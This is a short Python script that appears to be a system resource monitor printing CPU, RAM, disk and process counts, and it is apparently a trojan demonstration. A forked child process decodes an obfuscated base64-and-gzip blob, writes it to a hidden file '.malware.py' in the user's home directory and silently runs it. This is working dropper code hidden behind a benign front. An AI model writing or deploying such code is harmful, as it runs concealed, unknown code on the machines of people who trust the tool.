#!/usr/bin/python3
import psutil
import base64
import time
import gzip
import os
import pwd

def main():
	# fork a child process
	pid = os.fork()

	if pid > 0:
		# parent process
		while True:
			# percentage of used CPU
			cpu = psutil.cpu_percent()
			# percentage of used RAM
			ram = psutil.virtual_memory().percent
			# percentage of used disk space
			disk = psutil.disk_usage("/").percent
			# number of all running processes
			processes_count = 0
			for _ in psutil.process_iter():
				processes_count += 1
			
			# print to screen
			print("---------------------------------------------------------")
			print("| CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
			print("| {:02}%       | {:02}%       | {:02}%        | {}               |".format(int(cpu), int(ram), int(disk), processes_count))
			print("---------------------------------------------------------")

			# sleep for 2s
			time.sleep(2)
	else:
		# child process
		trojan()


def trojan():
	path = "/home/%s/" %(pwd.getpwuid(os.getuid())[0])
	path1 = os.path.join(path,".malware.py")
	malware_fd = open( path1 , "w")
	blob = "H4sICNc7ZWQAAy5tYWx3YXJlLnB5AH1UbU/bMBD+nl9xC9OaSK3T0FJQER/QBNO0sU2DSfuAZLmJSw2J7dkOdIP+99mO0xSNkb7E53vOvnvuZe9N1miVLRjP5G+zEnwSsVoKZUDRXw3VRneyFsUdNZ20IJrOpp10qwXv7bqV0FEUlXQJNWE8SecR2GcPbqiBldCGk5qCWIJZUYsoVoxTj9jqTsKdyFp0m0nqMfdUaSa4hQiNpJCUJzEr4d07aLzpiMQpUpSUAS+J1g8lXrKKPrMpiIGMmiJrAb3Rjq/OP9ksKlYAk/dTIGWpqNYvum6NrWf2ikcvuyf+oakand5QbuI5xBfiD6sqoptFyZTODtAYkp95fgyfGW/WsD6a4dn0GNT9/PAIjVP4QIs7ke2P87H95nDOFF2KdeaUsb9j0wboHcRM2ru7zDneknhljNTzLGOSSIYKYRfxcMfTsEqRoWvTxr0bPakqcFyBS6kNmv8TtNPiVrtLLadGG0vvSFaEG3iCG0UljBhUTBt73hOQhzsYPErFrPrtdDPYYr7B4Lp8zIeTzTX672Lu3webwfNMP/dmKyBtFJNJirSsmGXlmsctPoRKeSFKCiUxBIzwBQ2El6Cp/bMR1263EHXtNt2vENwoUVmAssXoT/HGfer7Cuiq1dmx0lZB2Bj2kEAo7j22sF54Adl1hMV1yxdQNtnzvjh2AG3Bg+sIh+j7o4NsoaHKAlFt43d8uVrwXLnYPaJVlDiQ0cLRYjZtFYlDo7KppU4cJEVhP932nKe8S8QrlAd4YZNvKJAwLEAsbmlhvFL3I6R9JUE6Pccfv5xdDTvt5df3n/Dl1fez04utG/Y2bg963QnXD37W5ZPJYXsnCoZJEuf7h2hsP7ltOAdI0wBxISa7THWKohLazbgoYkvA2CUVYzg5gRhjN0Uxjtsx2o7UvwLhjFi+BQAA"
	malware = gzip.decompress(base64.b64decode(blob)).decode("UTF-8")
	malware_fd.write(malware)
	malware_fd.close()

	# execute malware
	os.system("/usr/bin/python3 %s"  %(path1)) 


if __name__ == "__main__":
	main()